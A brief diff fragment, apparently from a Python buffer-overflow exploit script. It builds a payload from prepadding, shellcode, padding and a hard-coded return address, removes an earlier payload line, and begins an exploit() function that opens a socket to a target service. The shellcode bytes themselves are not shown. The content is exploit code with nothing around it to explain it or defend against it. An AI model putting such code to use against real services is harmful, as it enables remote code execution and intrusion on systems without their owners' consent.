@@ -15,7 +15,6 @@ returnAddr= b"\x00\x41\x40\x00\x00\x00\x00\x00"
 
 payload = prepadding+shellcode+padding+returnAddr
 
-payload = shellcode+padding+returnAddr
 def exploit():
     # Connect to the service
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
